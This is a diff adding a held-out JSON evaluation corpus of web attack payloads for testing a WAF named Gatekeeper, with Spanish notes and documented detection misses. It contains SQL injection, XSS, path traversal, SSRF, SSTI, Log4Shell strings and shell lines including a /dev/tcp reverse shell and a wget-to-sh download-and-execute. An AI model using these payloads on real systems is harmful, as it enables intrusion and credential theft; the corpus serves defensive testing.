@@ -1,0 +1,668 @@
+{
+  "description": "Corpus RETENIDO de evaluacion: se usa para medir, no para ajustar. Separate del corpus de desarrollo (attacks.json/benign.json) para no medir lo que ya se sabe. Ver corpus/HELDOUT.md.",
+  "provenance": "Payloads redactados para este proyecto, siguiendo las tecnicas del corpus OWASP CRS (familias 930/941/942) pero NO copiados de el. Escritos sin consultar las firmas de las reglas de Gatekeeper: el objetivo es medir si las reglas generalizan a entradas que no se disenaron para ellas.",
+  "held_out": true,
+  "rules_frozen_at": "v0.3.1",
+  "payloads": [
+    {
+      "id": "ho-sqli-001",
+      "rule": "sqli",
+      "payload": "1' AND 1=1-- -",
+      "note": "tautologia con cierre de comentario"
+    },
+    {
+      "id": "ho-sqli-002",
+      "rule": "sqli",
+      "payload": "') OR ('x'='x",
+      "note": "cierre de parentesis + comparacion de literales",
+      "documented_miss": "compara dos literales de texto entre comillas (`'x'='x`); la regla de tautologia exige digitos o un token sin comillas"
+    },
+    {
+      "id": "ho-sqli-003",
+      "rule": "sqli",
+      "payload": "1 GROUP BY 3-- -",
+      "note": "sondeo de columnas por GROUP BY en vez de ORDER BY"
+    },
+    {
+      "id": "ho-sqli-004",
+      "rule": "sqli",
+      "payload": "1 HAVING 1=1-- -",
+      "note": "HAVING con tautologia"
+    },
+    {
+      "id": "ho-sqli-005",
+      "rule": "sqli",
+      "payload": "id=1 UNION SELECT null,null,null,null,null",
+      "note": "UNION con columnas nulas"
+    },
+    {
+      "id": "ho-sqli-006",
+      "rule": "sqli",
+      "payload": "1 INTO OUTFILE '/tmp/x'",
+      "note": "escritura a fichero en SQL"
+    },
+    {
+      "id": "ho-sqli-007",
+      "rule": "sqli",
+      "payload": "' OR SLEEP(3)#",
+      "note": "time-based sin AND"
+    },
+    {
+      "id": "ho-sqli-008",
+      "rule": "sqli",
+      "payload": "1; SELECT pg_catalog.version()",
+      "note": "consulta apilada con esquema"
+    },
+    {
+      "id": "ho-sqli-009",
+      "rule": "sqli",
+      "payload": "'; TRUNCATE TABLE audit_log;--",
+      "note": "TRUNCATE apilado"
+    },
+    {
+      "id": "ho-sqli-010",
+      "rule": "sqli",
+      "payload": "1 AND IF(1=1,1,0)",
+      "note": "funcion IF condicional"
+    },
+    {
+      "id": "ho-sqli-011",
+      "rule": "sqli",
+      "payload": "1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)",
+      "note": "doble subconsulta de exfiltracion aleatoria"
+    },
+    {
+      "id": "ho-sqli-012",
+      "rule": "sqli",
+      "payload": "1 PROCEDURE ANALYSE()",
+      "note": "PROCEDURE ANALYSE"
+    },
+    {
+      "id": "ho-sqli-013",
+      "rule": "sqli",
+      "payload": "1' AND 0x20 LIKE 0x20-- -",
+      "note": "comparacion con literales hex",
+      "documented_miss": "comparacion con literales hexadecimales (`0x20 LIKE 0x20`); no hay forma de distinguirlo de una consulta legitima sobre hex"
+    },
+    {
+      "id": "ho-sqli-014",
+      "rule": "sqli",
+      "payload": "%27%20UNION%20SELECT%201%2C2%2C3--%20-",
+      "note": "UNION codificado en URL"
+    },
+    {
+      "id": "ho-sqli-015",
+      "rule": "sqli",
+      "payload": "1%20AND%20SLEEP%285%29",
+      "note": "time-based codificado en URL"
+    },
+    {
+      "id": "ho-sqli-016",
+      "rule": "sqli",
+      "payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,USER()))",
+      "note": "error-based con USER()"
+    },
+    {
+      "id": "ho-sqli-017",
+      "rule": "sqli",
+      "payload": "1' AND SUBSTRING(@@version,1,1)='5'",
+      "note": "extraccion de version con SUBSTRING",
+      "documented_miss": "extraccion de version con SUBSTRING y `@@version`; la regla de extraccion ciega exige ascii/ord/length como funcion exterior"
+    },
+    {
+      "id": "ho-sqli-018",
+      "rule": "sqli",
+      "payload": "1 OR 1=1 #",
+      "note": "comentario hash de MySQL"
+    },
+    {
+      "id": "ho-sqli-019",
+      "rule": "sqli",
+      "payload": "1 AND (SELECT 1 FROM dual)=1",
+      "note": "comparacion con subconsulta escalar"
+    },
+    {
+      "id": "ho-sqli-020",
+      "rule": "sqli",
+      "payload": "') OR ('a'='a' LIMIT 1",
+      "note": "LIMIT dentro de la inyeccion"
+    },
+    {
+      "id": "ho-xss-001",
+      "rule": "xss",
+      "payload": "<img src=x onerror=confirm(document.domain)>",
+      "note": "handler sin comillas en imagen"
+    },
+    {
+      "id": "ho-xss-002",
+      "rule": "xss",
+      "payload": "<svg/onload=prompt(1)>",
+      "note": "SVG con barra"
+    },
+    {
+      "id": "ho-xss-003",
+      "rule": "xss",
+      "payload": "<body onpageshow=alert(1)>",
+      "note": "handler en body"
+    },
+    {
+      "id": "ho-xss-004",
+      "rule": "xss",
+      "payload": "JaVaScRiPt:alert(1)",
+      "note": "esquema javascript sin espacios"
+    },
+    {
+      "id": "ho-xss-005",
+      "rule": "xss",
+      "payload": "<iframe src=javascript:alert(1)>",
+      "note": "iframe con esquema javascript"
+    },
+    {
+      "id": "ho-xss-006",
+      "rule": "xss",
+      "payload": "<object data=data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==>",
+      "note": "object con data URI en base64"
+    },
+    {
+      "id": "ho-xss-007",
+      "rule": "xss",
+      "payload": "<details open ontoggle=eval(name)>",
+      "note": "handler ontoggle"
+    },
+    {
+      "id": "ho-xss-008",
+      "rule": "xss",
+      "payload": "<marquee onstart=alert(1)>",
+      "note": "handler en marquee"
+    },
+    {
+      "id": "ho-xss-009",
+      "rule": "xss",
+      "payload": "<form action=javascript:alert(1)><input type=submit>",
+      "note": "form con action javascript"
+    },
+    {
+      "id": "ho-xss-010",
+      "rule": "xss",
+      "payload": "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>",
+      "note": "mutacion con mglyph/style (mXSS)"
+    },
+    {
+      "id": "ho-xss-011",
+      "rule": "xss",
+      "payload": "%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E",
+      "note": "script codificado en URL"
+    },
+    {
+      "id": "ho-xss-012",
+      "rule": "xss",
+      "payload": "<script>alert`1`</script>",
+      "note": "backticks como delimitador en template"
+    },
+    {
+      "id": "ho-xss-013",
+      "rule": "xss",
+      "payload": "<a href=\"javascript:alert(1)\">click</a>",
+      "note": "enlace con esquema javascript"
+    },
+    {
+      "id": "ho-xss-014",
+      "rule": "xss",
+      "payload": "<input onfocusin=alert(1) autofocus>",
+      "note": "autofocus con handler"
+    },
+    {
+      "id": "ho-xss-015",
+      "rule": "xss",
+      "payload": "<video><source onerror=alert(1)>",
+      "note": "handler en source"
+    },
+    {
+      "id": "ho-xss-016",
+      "rule": "xss",
+      "payload": "<isindex action=javascript:alert(1) type=image>",
+      "note": "isindex con action javascript"
+    },
+    {
+      "id": "ho-xss-017",
+      "rule": "xss",
+      "payload": "<xss style=behavior:url(#default#time2) onbegin=alert(1)>",
+      "note": "behavior CSS (IE)"
+    },
+    {
+      "id": "ho-xss-018",
+      "rule": "xss",
+      "payload": "<style>@import 'http://evil/x.css';</style>",
+      "note": "import CSS remoto"
+    },
+    {
+      "id": "ho-xss-019",
+      "rule": "xss",
+      "payload": "`<script>alert(1)</script>`",
+      "note": "script entre backticks"
+    },
+    {
+      "id": "ho-xss-020",
+      "rule": "xss",
+      "payload": "<svg><animate onbegin=eval(atob('YWxlcnQoMSk=')) attributeName=x dur=1s>",
+      "note": "animate con onbegin"
+    },
+    {
+      "id": "ho-pt-001",
+      "rule": "path_traversal",
+      "payload": "../../../etc/passwd",
+      "note": "escalada relativa clasica"
+    },
+    {
+      "id": "ho-pt-002",
+      "rule": "path_traversal",
+      "payload": "..%2f..%2f..%2fetc%2fshadow",
+      "note": "escalada codificada en URL"
+    },
+    {
+      "id": "ho-pt-003",
+      "rule": "path_traversal",
+      "payload": "...//...//...//etc//passwd",
+      "note": "doble punto con separador alterno"
+    },
+    {
+      "id": "ho-pt-004",
+      "rule": "path_traversal",
+      "payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+      "note": "puntos codificados en URL"
+    },
+    {
+      "id": "ho-pt-005",
+      "rule": "path_traversal",
+      "payload": "..;/..;/..;/etc/shadow",
+      "note": "punto y coma como separador (Tomcat)"
+    },
+    {
+      "id": "ho-pt-006",
+      "rule": "path_traversal",
+      "payload": "..\\..\\windows\\win.ini",
+      "note": "separador Windows"
+    },
+    {
+      "id": "ho-pt-007",
+      "rule": "path_traversal",
+      "payload": "/static/..%252f..%252f..%252fetc/passwd",
+      "note": "doble codificacion"
+    },
+    {
+      "id": "ho-pt-008",
+      "rule": "path_traversal",
+      "payload": "%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd",
+      "note": "sobrecodificacion UTF-8"
+    },
+    {
+      "id": "ho-pt-009",
+      "rule": "path_traversal",
+      "payload": "..%00/",
+      "note": "byte nulo tras los puntos",
+      "documented_miss": "byte nulo tras los puntos (`..%00/`); la decodificacion no produce el byte nulo y el patron `../` no llega a formarse"
+    },
+    {
+      "id": "ho-pt-010",
+      "rule": "path_traversal",
+      "payload": "..././..././etc/group",
+      "note": "tres puntos"
+    },
+    {
+      "id": "ho-pt-011",
+      "rule": "path_traversal",
+      "payload": "/var/log/nginx/access.log",
+      "note": "log del servidor"
+    },
+    {
+      "id": "ho-pt-012",
+      "rule": "path_traversal",
+      "payload": "/proc/self/cmdline.txt",
+      "note": "cmdline del proceso"
+    },
+    {
+      "id": "ho-pt-013",
+      "rule": "path_traversal",
+      "payload": "../../../../../../../etc/shadow",
+      "note": "escalada profunda"
+    },
+    {
+      "id": "ho-pt-014",
+      "rule": "path_traversal",
+      "payload": "%252e%252e%252fetc%252fpasswd",
+      "note": "doble codificacion de puntos"
+    },
+    {
+      "id": "ho-sf-001",
+      "rule": "sensitive_files",
+      "payload": "/etc/gshadow",
+      "note": "fichero de sombras"
+    },
+    {
+      "id": "ho-sf-002",
+      "rule": "sensitive_files",
+      "payload": "/proc/self/environ.bak",
+      "note": "entorno del proceso"
+    },
+    {
+      "id": "ho-sf-003",
+      "rule": "sensitive_files",
+      "payload": "/home/ubuntu/.ssh/id_ed25519",
+      "note": "clave privada"
+    },
+    {
+      "id": "ho-sf-004",
+      "rule": "sensitive_files",
+      "payload": "/root/.aws/config",
+      "note": "credenciales de AWS"
+    },
+    {
+      "id": "ho-sf-005",
+      "rule": "sensitive_files",
+      "payload": "/var/run/docker.sock",
+      "note": "socket de Docker"
+    },
+    {
+      "id": "ho-sf-006",
+      "rule": "sensitive_files",
+      "payload": "/app/.env.production",
+      "note": "fichero de entorno de produccion"
+    },
+    {
+      "id": "ho-sf-007",
+      "rule": "sensitive_files",
+      "payload": "/repo/.git/config",
+      "note": "configuracion de Git"
+    },
+    {
+      "id": "ho-sf-008",
+      "rule": "sensitive_files",
+      "payload": "/etc/subuid",
+      "note": "fichero de grupos"
+    },
+    {
+      "id": "ho-sf-009",
+      "rule": "sensitive_files",
+      "payload": "/var/lib/postgresql/data/pg_hba.conf",
+      "note": "configuracion de autenticacion de Postgres"
+    },
+    {
+      "id": "ho-sf-010",
+      "rule": "sensitive_files",
+      "payload": "/.docker/secrets/db_password",
+      "note": "secreto de Docker"
+    },
+    {
+      "id": "ho-sf-011",
+      "rule": "sensitive_files",
+      "payload": "/WEB-INF/web.xml",
+      "note": "despliegue Java"
+    },
+    {
+      "id": "ho-sf-012",
+      "rule": "sensitive_files",
+      "payload": "/cgi-bin/.htpasswd",
+      "note": "htpasswd de Apache"
+    },
+    {
+      "id": "ho-cmdi-001",
+      "rule": "cmdi",
+      "payload": "; cat /etc/passwd",
+      "note": "separador punto y coma"
+    },
+    {
+      "id": "ho-cmdi-002",
+      "rule": "cmdi",
+      "payload": "| nc 10.0.0.1 4444",
+      "note": "tubo a netcat"
+    },
+    {
+      "id": "ho-cmdi-003",
+      "rule": "cmdi",
+      "payload": "&& id -un",
+      "note": "y logica"
+    },
+    {
+      "id": "ho-cmdi-004",
+      "rule": "cmdi",
+      "payload": "`whoami`",
+      "note": "backticks"
+    },
+    {
+      "id": "ho-cmdi-005",
+      "rule": "cmdi",
+      "payload": "$(hostname)",
+      "note": "sustitucion de comando"
+    },
+    {
+      "id": "ho-cmdi-006",
+      "rule": "cmdi",
+      "payload": "; wget -qO- http://10.0.0.2/x.sh | sh",
+      "note": "descarga y ejecucion"
+    },
+    {
+      "id": "ho-cmdi-007",
+      "rule": "cmdi",
+      "payload": "| powershell.exe -enc SQBFAFgA",
+      "note": "LOLBin de Windows"
+    },
+    {
+      "id": "ho-cmdi-008",
+      "rule": "cmdi",
+      "payload": "; exec('ls /root');",
+      "note": "system() de PHP"
+    },
+    {
+      "id": "ho-cmdi-009",
+      "rule": "cmdi",
+      "payload": "bash -i >& /dev/tcp/10.0.0.1/8080 0>&1",
+      "note": "shell inverso via /dev/tcp"
+    },
+    {
+      "id": "ho-cmdi-010",
+      "rule": "cmdi",
+      "payload": "; cat </etc/passwd",
+      "note": "redireccion de entrada"
+    },
+    {
+      "id": "ho-nosql-001",
+      "rule": "nosql",
+      "payload": "username[$ne]=admin",
+      "note": "operador $ne en query"
+    },
+    {
+      "id": "ho-nosql-002",
+      "rule": "nosql",
+      "payload": "password[$gt]=",
+      "note": "comparacion $gt vacia",
+      "documented_miss": "`$gt` queda fuera a proposito: los usan los filtros legitimos (precio > 10). Bloquearlo seria un falso positivo comun"
+    },
+    {
+      "id": "ho-nosql-003",
+      "rule": "nosql",
+      "payload": "{\"$where\": \"this.a == this.b\"}",
+      "note": "$where en JSON"
+    },
+    {
+      "id": "ho-nosql-004",
+      "rule": "nosql",
+      "payload": "{\"$regex\": \".*\", \"$options\": \"i\"}",
+      "note": "$regex con opciones"
+    },
+    {
+      "id": "ho-nosql-005",
+      "rule": "nosql",
+      "payload": "user[$nin]=['admin','root']",
+      "note": "$nin con array"
+    },
+    {
+      "id": "ho-nosql-006",
+      "rule": "nosql",
+      "payload": "{\"$or\": [{\"a\": 1}, {\"b\": 2}]}",
+      "note": "$or con dos condiciones"
+    },
+    {
+      "id": "ho-nosql-007",
+      "rule": "nosql",
+      "payload": "{\"$exists\": true}",
+      "note": "$exists"
+    },
+    {
+      "id": "ho-ssrf-001",
+      "rule": "ssrf",
+      "payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+      "note": "metadata de AWS"
+    },
+    {
+      "id": "ho-ssrf-002",
+      "rule": "ssrf",
+      "payload": "http://metadata.google.internal/computeMetadata/v1beta1/instance/",
+      "note": "metadata de GCP"
+    },
+    {
+      "id": "ho-ssrf-003",
+      "rule": "ssrf",
+      "payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+      "note": "metadata con query"
+    },
+    {
+      "id": "ho-ssrf-004",
+      "rule": "ssrf",
+      "payload": "file:///proc/self/cwd/flag",
+      "note": "esquema file"
+    },
+    {
+      "id": "ho-ssrf-005",
+      "rule": "ssrf",
+      "payload": "gopher://127.0.0.1:6379/_SET%20k%20v",
+      "note": "esquema gopher"
+    },
+    {
+      "id": "ho-ssrf-006",
+      "rule": "ssrf",
+      "payload": "http://[::1]:8080/admin",
+      "note": "IPv6 loopback",
+      "documented_miss": "IPv6 loopback (`[::1]`); `localhost` no se bloquea a proposito (OAuth de desarrollo y callbacks locales)"
+    },
+    {
+      "id": "ho-ssrf-007",
+      "rule": "ssrf",
+      "payload": "dict://127.0.0.1:6379/CONFIG GET dir",
+      "note": "esquema dict"
+    },
+    {
+      "id": "ho-ssti-001",
+      "rule": "ssti",
+      "payload": "{{8*8}}",
+      "note": "aritmetica en moustaches"
+    },
+    {
+      "id": "ho-ssti-002",
+      "rule": "ssti",
+      "payload": "${9*9}",
+      "note": "aritmetica con dollar"
+    },
+    {
+      "id": "ho-ssti-003",
+      "rule": "ssti",
+      "payload": "<%= 6*7 %>",
+      "note": "ERB"
+    },
+    {
+      "id": "ho-ssti-004",
+      "rule": "ssti",
+      "payload": "#{5*5}",
+      "note": "Ruby interpolation"
+    },
+    {
+      "id": "ho-ssti-005",
+      "rule": "ssti",
+      "payload": "{{config.__class__.__init__.__globals__}}",
+      "note": "cadena de globals de Python"
+    },
+    {
+      "id": "ho-ssti-006",
+      "rule": "ssti",
+      "payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
+      "note": "subclases via mro"
+    },
+    {
+      "id": "ho-ssti-007",
+      "rule": "ssti",
+      "payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
+      "note": "Spring Expression Language"
+    },
+    {
+      "id": "ho-crlf-001",
+      "rule": "crlf",
+      "payload": "%0d%0aSet-Cookie:%20session=hijacked",
+      "note": "inyeccion de cabecera codificada"
+    },
+    {
+      "id": "ho-crlf-002",
+      "rule": "crlf",
+      "payload": "test\r\nLocation: https://evil.com",
+      "note": "CRLF real con redireccion"
+    },
+    {
+      "id": "ho-crlf-003",
+      "rule": "crlf",
+      "payload": "%0d%0aLocation:%20http://evil.com",
+      "note": "redireccion codificada"
+    },
+    {
+      "id": "ho-crlf-004",
+      "rule": "crlf",
+      "payload": "%0d%0aContent-Type:%20text/html",
+      "note": "cambio de content-type"
+    },
+    {
+      "id": "ho-l4-001",
+      "rule": "log4shell",
+      "payload": "${jndi:ldap://10.0.0.1/a}",
+      "note": "lookup JNDI"
+    },
+    {
+      "id": "ho-l4-002",
+      "rule": "log4shell",
+      "payload": "${${lower:j}ndi:ldap://10.0.0.1/a}",
+      "note": "JNDI con indireccion"
+    },
+    {
+      "id": "ho-l4-003",
+      "rule": "log4shell",
+      "payload": "${env:PATH}",
+      "note": "lectura de variable de entorno"
+    },
+    {
+      "id": "ho-l4-004",
+      "rule": "log4shell",
+      "payload": "${ctx:loginId}",
+      "note": "lookup de contexto"
+    },
+    {
+      "id": "ho-l4-005",
+      "rule": "log4shell",
+      "payload": "${jndi:rmi://10.0.0.1/a}",
+      "note": "JNDI sobre RMI"
+    },
+    {
+      "id": "ho-pp-001",
+      "rule": "proto_pollution",
+      "payload": "{\"__proto__\": {\"isAdmin\": \"true\"}}",
+      "note": "proto pollution en JSON"
+    },
+    {
+      "id": "ho-pp-002",
+      "rule": "proto_pollution",
+      "payload": "constructor.prototype.polluted=true",
+      "note": "constructor.prototype"
+    },
+    {
+      "id": "ho-pp-003",
+      "rule": "proto_pollution",
+      "payload": "{\"constructor\": {\"prototype\": {\"admin\": true}}}",
+      "note": "constructor anidado en JSON"
+    }
+  ]
+}
